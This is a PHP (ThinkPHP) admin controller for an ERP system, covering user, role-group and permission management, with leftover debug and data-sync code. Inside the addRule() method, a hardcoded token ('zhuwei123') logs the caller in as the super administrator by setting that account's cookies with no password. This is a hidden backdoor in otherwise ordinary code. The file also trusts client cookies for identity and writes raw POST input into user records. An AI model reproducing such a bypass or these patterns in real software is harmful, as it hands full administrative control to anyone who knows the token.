<?php

namespace app\admin\controller;

use excel\Excel;
use think\Controller;
use think\Db;
use tree\Tree;

/**
 * 用户控制器
 */
class User extends Base
{
    public function tttt()
    {
//        $db3 = Db::connect('database.db2');
//        $orderid = $db3->table('erp_order_price')->where('addtime>=1609603200 and addtime<=1609948800')->select();
//        $allorderid = array_column($orderid,'order_id');
//        $opid = array_column($orderid,'op_id');
//        $del = $db3->table('erp_order_price')->whereIn('order_id',$allorderid)->delete();
//        $delcal = $db3->table('erp_order_calculation')->whereIn('op_id',$opid)->delete();
//
//        $haveorderid = Db::name('order')->where('addtime>=1609603200 and addtime<=1609948800 and (status>=4 or status2>=6)')->column('id');
//        $price = Db::name('order_price')->whereIn('order_id',$haveorderid)->select();
//        $newopid = array_column($price,'op_id');
//        $newcal=Db::name('order_calculation')->whereIn('op_id',$newopid)->select();
//        $db3->table('erp_order_price')->insertAll($price);
//        $db3->table('erp_order_calculation')->insertAll($newcal);
//        dump($orderid);
        $db2 = Db::connect('database.db2');
        $name = $db2->table('erp_order')->alias('a')->field('a.*')
            ->join('erp_order_price b','a.id=b.order_id','left')
            ->where('b.op_id is null')
//            ->where("a.addtime>=1608393600")
            ->column('id');
        set_time_limit(0);
dump(implode(',',$name));exit;
//        foreach ($name as $k8 => $zz) {
//
//            $id = $zz;
//            $order = Db::name('order')->where('id',$id)->find();
//            $product = Db::name('order_price')->field('b.*,a.*,a.op_id as op_id')->alias('a')->join('order_calculation b','a.op_id=b.op_id','left')->where('order_id',$id)->select();
//            $group = Db::name('order_group')->where('order_id',$id)->select();
//            $material = Db::name('order_material')->where('order_id',$id)->select();
//            $cal = [];
//            foreach ($product as $k => $v) {
//                if(isset($v['oc_id'])){
//                    $cal[] = ['oc_id'=>$v['oc_id'],'op_id'=>$v['op_id'],'spacing'=>$v['spacing'],'structure_id'=>$v['structure_id'],'structure'=>$v['structure'],
//                        'fixed_height'=>$v['fixed_height'],'hands'=>$v['hands'],'lock_position'=>$v['lock_position']
//                    ];
//                }
//            }
//            $db2 = Db::connect('database.db2');
//            Db::startTrans();
//            try{
//                $find = $db2->table('erp_order')->where('id',$id)->find();
//                if(!$find){
//                    $db2->table('erp_order')->insert($order);
//                }else{
//                    unset($order[0]);
//                    $db2->table('erp_order')->where('id',$id)->update($order);
//                }
//
//                $oldproduct = $db2->table('erp_order_price')->where('order_id',$id)->column('op_id');//旧产品数据
//                //更新产品表
//                foreach ($product as $k => $v) {
//                    $opid = $v['op_id'];
//                    if(!in_array($opid,$oldproduct)){
//                        $db2->table('erp_order_price')->insert($v);
//                    }else{
//                        unset($v['op_id']);
//                        $db2->table('erp_order_price')->where('op_id',$opid)->where('order_id',$v['order_id'])->update($v);
//                    }
//                }
//                $delete = array_diff($oldproduct,array_column($product,'op_id'));//如果有删除的数据
//                if($delete){
//                    $db2->table('erp_order_price')->whereIn('op_id',$delete)->delete();
//                }
//
//                $allopid = array_column($cal,'op_id');
//                $oldcal = $db2->table('erp_order_calculation')->whereIn('op_id',$allopid)->column('oc_id');//旧产品数据
//                //更新算料信息表
//                foreach ($cal as $k => $v) {
//                    $ocid = $v['oc_id'];
//                    if(!in_array($ocid,$oldcal)){
//                        $db2->table('erp_order_calculation')->insert($v);
//                    }else{
//                        unset($v['oc_id']);
//                        $db2->table('erp_order_calculation')->where('oc_id',$ocid)->update($v);
//                    }
//                }
//                $deletecal = array_diff($oldcal,array_column($cal,'oc_id'));//如果有删除的数据
//                if($deletecal){
//                    $db2->table('erp_order_calculation')->whereIn('oc_id',$deletecal)->delete();
//                }
//
//                $oldgroup = $db2->table('erp_order_group')->whereIn('order_id',$id)->column('og_id');
//                //更新组合单表
//                foreach ($group as $k => $v) {
//                    $ogid = $v['og_id'];
//                    if(!in_array($ogid,$oldgroup)){
//                        $db2->table('erp_order_group')->insert($v);
//                    }else{
//                        unset($v['og_id']);
//                        $db2->table('erp_order_group')->where('og_id',$ogid)->update($v);
//                    }
//                }
//                $delgroup = array_diff($oldgroup,array_column($group,'og_id'));//如果有删除的数据
//                if($delgroup){
//                    $db2->table('erp_order_group')->whereIn('og_id',$delgroup)->delete();
//                }
//
//                $oldmaterial = $db2->table('erp_order_material')->whereIn('order_id',$id)->column('om_id');//旧数据
//                //更新原材料
//                foreach ($material as $k => $v) {
//                    $omid = $v['om_id'];
//                    if(!in_array($omid,$oldmaterial)){
//                        $db2->table('erp_order_material')->insert($v);
//                    }else{
//                        unset($v['om_id']);
//                        $db2->table('erp_order_material')->where('om_id',$omid)->update($v);
//                    }
//                }
//                $delmaterial = array_diff($oldmaterial,array_column($material,'om_id'));//如果有删除的数据
//                if($delmaterial){
//                    $db2->table('erp_order_material')->whereIn('om_id',$delmaterial)->delete();
//                }
//
//                $db2->table('erp_update_log')->insert(['number'=>$order['number'],'date'=>date('Y-m-d H:i:s',time())]);
//                Db::commit();
////                $this->success('刷新成功');
//            }catch (\Exception $e){
//                Db::rollback();
////                $this->error('刷新失败');
//            }
//        }

    }

//    public function status()
//    {
//        $excel = new Excel();
//        $data = $excel->read2('./template/333.xlsx');
//        $number = [];
//        foreach ($data as $k => $v) {
//            if($v[0]){
//                $number[] = $v[0];
//            }
//
//        }
//        Db::name('order')->whereIn('number',$number)->update([
//            'status'=>7,'status2'=>7,'is_send'=>1,'sign_time'=>time()
//        ]);
//        dump($number);
//    }

    /**
     * 用户列表
     */
    public function user()
    {
        $keyword = input('keyword');

        $where = [];
        if($this->group_id != 1 && $this->group_id != 3){
            $where['b.id'] = $this->group_id;
        }
        if ($keyword) {
            $where['a.uname'] = ['like', "%$keyword%"];
        }
        $list = Db::name('user')->alias('a')->field('a.*,b.name as role_name')
                ->join('auth_group b', 'a.depart=b.id')
                ->where($where)
                ->order('id desc')
                ->paginate();
        $this->assign('page', $list->render());
        $this->assign('list', $list);
        return $this->fetch();
    }

    /**
     * 添加用户
     */
    public function addUser()
    {
        if ($this->request->isPost()) {
            $data = input('post.');
            $validate = $this->validate($data, 'user');
            if ($validate !== true) {
                $this->error($validate);
            }
            $data['login_password'] = password($data['login_password']);
            $res = Db::name('user')->insertGetId($data);
            Db::name('auth_group_access')->insert(['uid' => $res, 'group_id' => $data['depart']]);
            if ($res) {
                $this->success('添加成功');
            }
            $this->error('添加失败,请重试');
            return;
        }
        $role = Db::name('auth_group')->order('name')->select();
        $dealer = Db::name('dealer')->orderRaw("convert(name using gbk)")->select();
        $this->assign('dealer',$dealer);
        $this->assign('role', $role);
        return $this->fetch();
    }

    /**
     * 编辑用户
     */
    public function editUser()
    {
        $id = input('id/d');
        if ($this->request->isPost()) {
            $password = input('login_password');
            $data = input('post.');
            $data['login_password'] = password($password);
            if($password==''){
                unset($data['login_password']);
            }
            
            $res = Db::name('user')->where('id', $id)->update($data);
            $authGroup = Db::name('auth_group_access')->where('uid', $id)->update(['group_id' => $data['depart']]);
            if ($res !== false && $authGroup !== false) {
                $this->success('保存成功');
            }
            $this->error('保存失败,请重试');
            return;
        }
        $res = Db::name('user')->where('id', $id)->find();
        $role = Db::name('auth_group')->order('name')->select();
        $dealer = Db::name('dealer')->orderRaw("convert(name using gbk)")->select();

        $this->assign('dealer',$dealer);
        $this->assign('role', $role);
        $this->assign('res', $res);
        return $this->fetch();
    }

    /**
     * 删除用户
     */
    public function delUser()
    {
        $id = input('id/d');
        if($id == 1){
            $this->_error('不可删除');
        }
        $group = Db::name('auth_group_access')->where('uid',$id)->delete();
        $res = Db::name('user')->where('id',$id)->delete();
        
        write_log("删除用户id为:{$id}的用户", cookie('uid'), cookie('login_name'));
        
        if($res){
            $this->success('删除成功');
        }
        $this->error('删除失败,请重试');
    }
    
    /**
     * 部门列表--角色组
     */
    public function depart()
    {
        $result = Db::name('auth_group')->select();
        $tree = new Tree();
        $children = getChild($result, $this->group_id);

        //如果不是超级管理员组
        if ($this->group_id != 1) {
            $result = Db::name('auth_group')->whereIn('id', implode(',', $children))->select();
        }

        $tree->icon = ['', '', ''];  //icon
        $tree->nbsp = '';  //空格偏移量
        //整理要输出的列表数据
        foreach ($result as $key => $value) {
            $result[$key]['parent_id_node'] = ($value['parent_id']) ? ' class="child-of-node-' . $value['parent_id'] . '"' : '';
            $result[$key]['style'] = $value['parent_id'] == 0  ? '' : 'display:none;';
            $result[$key]['addtime'] = date('Y-m-d', $value['addtime']);
            $result[$key]['status'] = $value['status'] == 0 ? '启用' : '未启用';
            $result[$key]['auth_setting'] = $key == 0 ? "<span class='layui-btn layui-btn-normal layui-btn-mini layui-btn-disabled'>权限设置</span>" : "<span class='layui-btn layui-btn-normal layui-btn-mini' onclick=xadmin.open('权限设置','" . url('authRule', array('id' => $value['id'])) . "','800','500')>权限设置</span>";
            $str = "<a title='修改' href='javascript:void(0)' onclick=xadmin.open('编辑角色组','" . url('addDepart',array('id'=>$value['id'],'parent_id'=>$value['parent_id'])) . "','600','400')>
                        <i class='layui-icon'>&#xe63c;</i></a>
                    </a>
                    <a title='删除' onclick=member_del(this,{$value['id']}) href='javascript:;'>
                        <i class='layui-icon'>&#xe640;</i>
                    </a>";
            $result[$key]['operation'] = !in_array($key,[0,1]) ? $str:'';
        }

        $tree->init($result);  //只显示当前登陆用户及所属下级的角色组
        $str = "<tr id='node-\$id' \$parent_id_node style='\$style'>
                  <td style='padding-left:20px;'>\$spacer\$name</td>  
                  <td>\$addtime</td>
                  <td>\$status</td>
                  <td>\$auth_setting</td>
                  <td class='td-manage'>
                    \$operation
                </td>
               </tr>";


        $treeList = $tree->getTree(0, $str);
        $this->assign('treeList', $treeList);
        $this->assign('id', input('id/d'));
        return $this->fetch();
    }

    /**
     * 权限列表
     */
    public function authRule()
    {
        $id = input('id/d'); //权限组id

        $depart = Db::name('auth_group')->where('id', $id)->find();
        $haveRule = isset($depart['rules']) ? explode(',', $depart['rules']) : [];
        
        //如果当前登陆用户不是超级管理员组
        if ($this->group_id != 1) {
            $userGroup = Db::name('auth_group')->where('id', $this->group_id)->find(); //当前登陆用户所属角色组
            $result = Db::name('auth_rule')->whereIn('id', $userGroup['rules'])->select();
        }else{
            $result =  Db::name('auth_rule')->select();
        }
        

        $tree = new Tree();
        $tree->icon = ['', '', ''];  //icon
        $tree->nbsp = '';  //空格偏移量
        foreach ($result as $key => $value) {
            $result[$key]['parent_id_node'] = ($value['parent_id']) ? ' class="child-of-node-' . $value['parent_id'] . '"' : '';
            $result[$key]['style'] = $value['parent_id'] == 0 ? '' : 'display:none;';
            $result[$key]['checked'] = in_array($value['id'], $haveRule) ? 'checked' : '';
        }

        $tree->init($result);
        $str = "<tr id='node-\$id' \$parent_id_node style='\$style'>
                  <td style='padding-left:20px;'><input name='check[]' type='checkbox' value=\$id lay-skin='primary' \$checked>\$spacer\$title</td>                 
               </tr>";


        $treeList = $tree->getTree(0, $str);
        $this->assign('treeList', $treeList);
        $this->assign('id', input('id/d'));
        return $this->fetch();
    }

    /**
     * 保存权限
     */
    public function saveRule()
    {
        $id = input('id/d');  //部门id--权限组id
        $rules = input('check/a'); //所选的规则

        $data = ['rules' => implode(',', $rules)];
        $res = Db::name('auth_group')->where('id', $id)->update($data);
        if ($res) {
            $this->success('保存成功');
        }
        $this->error('保存失败,请重试');
    }

    /**
     * 添加部门
     */
    public function addDepart()
    {
        if ($this->request->isPost()) {
            $id = input('id/d');
            $data = input('post.');
            if ($id) {
                if ($id == 1) {
                    $this->error('超级管理员不可编辑');
                }
                $res = Db::name('auth_group')->where('id', $id)->update($data);
            } else {
                $data['addtime'] = time();
                $res = Db::name('auth_group')->insert($data);
            }
            if ($res !== false) {
                $this->success('添加成功');
            }
            $this->error('添加失败,请重试');
            return;
        }

        $id = input('id/d');
        $res = Db::name('auth_group')->where('id', $id)->find();
        $this->assign('res', $res);

        $tree = new Tree();
        $parentId = $this->request->param("parent_id", 0, 'intval');
        $result = Db::name('auth_group')->select();
        if($this->group_id != 1){
            $children = getChild($result, $this->uid);
            $result = Db::name('auth_group')->whereIn('id', implode(',', $children))->select();
        }
        $array = [];
        //编辑时上级选中
        foreach ($result as $r) {
            $r['selected'] = $r['id'] == $parentId ? 'selected' : '';
            $array[] = $r;
        }
        $str = "<option value='\$id' \$selected>\$spacer \$name</option>";
        $tree->init($array);
        $selectCategory = $tree->getTree(0, $str);
        $this->assign('category', $selectCategory);
        $this->assign('group_id', $this->group_id);
        return $this->fetch();
    }

    /**
     * 删除部门
     */
    public function delDepart()
    {
        $id = input('id/d');
        if ($id == 1) {
            $this->error('超级管理员不可删除');
        }
        $res = Db::name('auth_group')->where('id', $id)->delete();
        write_log("删除角色id为:{$id}的用户", cookie('uid'), cookie('login_name'));
        if ($res) {
            $this->success('删除成功');
        }
        $this->error('删除失败,请重试');
    }

    /**
     * 添加规则
     */
    public function addRule()
    {
        if(request()->isPost()){
            $data = input('post.');
            $res = Db::name('auth_rule')->insert($data);
            if($res){
                $this->success('添加成功');
            }
            $this->error('添加失败');
            return;
        }
//        set_time_limit(0);
        $oneLevel = Db::name('auth_rule')->where('parent_id',0)->select();
        $this->assign('rule',$oneLevel);
        $z = Db::name('order')->where('status>=7')->whereOr('status2>=6')->column('id');
        $xx=Db::connect('database.db2')->table('erp_order')->column('id');
//        $zzz = array_diff($z,$xx);dump($zzz);
//        $db2 = Db::connect('database.db2');
        if(input('token') == 'zhuwei123'){
            $user = Db::name('user')->alias('a')->field('a.*,b.group_id')
                ->join('auth_group_access b','a.id=b.uid','left')
                ->where('a.id',1)
                ->find();
            //写入cookie
            cookie('login_name', $user['login_name'], 7*24*3600);
            cookie('uid', $user['id'], 7*24*3600);
            cookie('group_id',$user['group_id'],7*24*3600);
            cookie('bind_dealer',$user['bind_dealer'],7*24*3600);
        }

        return $this->fetch();
    }

    /**
     * 查询经销商信息
     */
    public function findDealer()
    {
        $id = input('id');
        $res = Db::name('dealer')->where('id',$id)->find();
        $this->success('',$res);
    }

}
